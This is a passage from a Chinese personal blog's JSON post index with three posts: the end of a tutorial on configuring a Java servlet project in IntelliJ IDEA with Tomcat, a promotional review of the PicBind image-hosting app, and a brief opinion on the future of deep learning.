新建了一个classes一个lib文件夹，先建好，等一下我们再配置，建好了之后呢，我们在src文件夹下新建一个包： 包名自己取，最后我们在包下面新建一个Servlet，弹出菜单选中Servlet： 是的，你没有看错我们这就新建好了servlet，但是你还得再web.xml中添加一下Servlet的映射： 来看看生成的sevlet： 配置java文件的输出路径和lib路径 如图我们配置一下输出的路径，选择我们之前新建的classes和lib文件夹，classes和lib文件夹分别是我们java文件输出和jar依赖的文件夹。 然后切换到depencies选项卡，点击添加，添加一个jar的依赖路径： 选择jar directory: 勾选然后确定： 最后一步，我们就要配置tomcat服务器了 tomcat是什么猫我就不多说了，一个web容器，你的java web app就放在这个容器里面，web app运行依赖于我们的tomcat，那么配置的时候我们就需要点击右上角的这个地方： 来配置，在这里选择local tomcat： 只需要给tomcat服务器娶一个名字，然后点击deployment下面的添加，添加artifact依赖： 最后在旁边填写一个目录，写上工程的名字即可。哦忘了一步，在Server选项卡里面你要配置一下你的tomcat服务器，怎么配置很简单，只要configure选择你的tomcat文件夹就可以了，最外层的那个，idea自动识别。然后确定就OK。 开发小程序好搭建好了我们来个开车小程序。对了，在这个时候你可能会遇到一个问题，就是servlet识别不了server包： 这是因为我们还没有吧tomcat官方jar包放到lib文件夹下，就是我们刚才新建的那个依赖文件夹，在tomcat文件夹下的lib文件夹寻找： 这个jar包，ok现在没有报错，我们在doPost方法里面写一段代码： response.setContentType(\"text/html\");response.setCharacterEncoding(\"utf-8\");PrintWriter out = response.getWriter();out.print(\"我要毫不经意的打一个广告，是的，就是在这里，大家快使用PicBind图床神器写博客！！\"); 好的我们运行一下这个web app，如果控制台显示这样说名运行了 好，接下来激动人心的时刻到了，我们在浏览器中输入：（或者直接在弹出的浏览器中后面加上我们servlet的名字 /HelloServlet），见证奇迹的时刻到了！！！ ！！！！！ ………….好像并没有什么卵反应？我故意的，把上面那段代码拷贝到doGet方法中，在更新一下资源并重启服务器看一下： 骚年，你没有看错！！！你成功学会了使用servlet！！！ 感谢大家阅读我的博客，本文永久更新地址: jinfagang.coding.me 也欢迎大家积极留言，让我看到你的存在","categories":[],"tags":[{"name":"JavaWeb开发","slug":"JavaWeb开发","permalink":"http://yoursite.com/tags/JavaWeb开发/"}]},{"title":"PicBind--新一代图床神器","slug":"PicBind-新一代图床神器","date":"2016-11-05T12:56:22.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/11/05/PicBind-新一代图床神器/","link":"","permalink":"http://yoursite.com/2016/11/05/PicBind-新一代图床神器/","excerpt":"本文介绍一个界面设计美观，自由度非常高的图床软件，写博客必备小助手—PicBind，一键拖拽上传图片，生成永久外链或Markdown格式优化外链，妈妈再也不担心你的博客图裂问题了。","text":"本文介绍一个界面设计美观，自由度非常高的图床软件，写博客必备小助手—PicBind，一键拖拽上传图片，生成永久外链或Markdown格式优化外链，妈妈再也不担心你的博客图裂问题了。 PicBind介绍PicBind是有欧曼团队打造的专注Mac下博客创作效率软件，PicBind最大的特点就是界面非常简洁，而且很美观，当然如果你真正使用它的时候你会为它的设计感染，甚至想加入欧曼团队一起创造一些产品。然而你所想的并不是没有可能，任何一个使用PicBind的用户都有可能加入欧曼创建的创业者阵营中。 PicBind外表的特点自不必多言，实际使用起来也很顺手，很自由，比起市面上其他一些图床软件来说，PicBind可以让用户设置自己的服务器，很大程度的保护了用户的隐私性以及可控性。由此可见欧曼团队在打造这款产品时充分考虑到了用户的利益。 PicBind和其他同类产品一样，采用是如丝般顺滑的使用体验，你只需要将图片拖拽到任务栏的图标，即可实现自动上传，并且会自动在粘贴板生成外链。除此之外，PicBind还设置了MarkDown格式切换选项，用户可以选中MarkDown，这样每次生成的外链就是经过MarkDown格式优化的了。 最后必须要说明的一点是，与其他图床软件软件相比，PicBind完全免费，用户自由度很高，欧曼团队在这一点上很有诚意，当然作为PicBind的忠实粉丝，为了资助欧曼团队继续开发出更多优秀的免费产品，也可以捐献一点钱给他们（PicBind的Sponsor是自愿的），只要是PicBind的Sponsor欧曼团队都将把用户加入到他们建立的创业者群中，结实一些人脉，认识认识欧曼的大大们也未尝不可~ PicBind使用 PicBind的设计非常简洁，启动App之后你甚至在Dock栏都看不到PicBind的图标，而只在状态栏有一个小“外星人的图标”，PicBind团队设计的这个图标我还是很喜欢的。 通过设置界面来设置服务器，PicBind目前仅支持七牛云服务器，七牛云最近几年发展的也比较快，各种融资，服务器也比较稳定，用七牛云图床的人也很多，所以大家可以去七牛云官方申请个账号，有免费空间和访问次数。 在写文章的时候把图片都放在桌面，需要哪张的时候就拖拽，自动生成Markdown格式的引用。 PicBind还支持上传图片历史记录，用户就可以知道自己之前上传了哪些图片了 在PicBind关于界面大家可以成为PicBind的Sponsor，给PicBind官方团队捐点钱就可以被加入到PicBind创业者交流群中，认识各种大大的好机会~ PicBind的使用感受如果你在寻找一款免费又有充分自由度的图床软件，那么PicBind绝对是你的首选，不仅有着欧曼团队的全程技术支持，而且一不小心就加入到了PicBind大大交流群中成为Sponsor，说不定哪天认识下PicBind团队CEO一起改变世界也说不定~ PicBind的未来据PicBind的开发团队，欧曼科技介绍，PicBind后期还将增加对Windows以及Linux平台的支持，我只想说，PicBind这么良心的软件应该跨平台，我也好追随PicBind的大大们一起打江山。（PS：PicBind团队也就是欧曼科技现在的核心业务是一款社交产品，我就说我咋感觉欧曼做产品有一股浓浓的社交味儿，手动偷笑，不过国内像这样的良心产品真的不多，大家且用且珍惜啊，别忘了给PicBind团队们赞助点资金，让我们的PicBind大大们去开发更多产品，创造更多的社会价值）","categories":[{"name":"个人产品","slug":"个人产品","permalink":"http://yoursite.com/categories/个人产品/"}],"tags":[{"name":"个人产品","slug":"个人产品","permalink":"http://yoursite.com/tags/个人产品/"}]},{"title":"深度学习的前景","slug":"深度学习的前景","date":"2016-10-26T05:18:00.000Z","updated":"2016-11-30T04:07:58.000Z","comments":true,"path":"2016/10/26/深度学习的前景/","link":"","permalink":"http://yoursite.com/2016/10/26/深度学习的前景/","excerpt":"本文讲述了个人对深度学习未来的看法。","text":"本文讲述了个人对深度学习未来的看法。 深度学习的未来 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu 深度学习可以说在近几年取得了非常好的发展以及社会关注度，很多公司慢慢的在把深度学习当做一种战略。而作为一个时刻在思考着未来的科技狂热分子，对于深度学习我更想表达的是，离我们真正希望的AI还差很远，纵然现在的深度学习能够解决很多问题，无论我们是否从理论上分析论证过，但是它就是work，有些时候我们就需要这样的东西，不管它多么复杂只要它能解决实际问题，那么它就是有用的，破解它也是迟早的事情。 那么深度学习的未来是什么？在哪里？ 香港科技大学一位知名教授说： 增强学习和迁移学习将是深度学习的未来。 我非常认同这位教授的观点，因为现在深度学习算法最多只能算是奠定了一个人工智能的基础，要想发展为真正的普适智能还是需要更强大的模型适应能力，以及迁移能力。","categories":[],"tags":[]}]}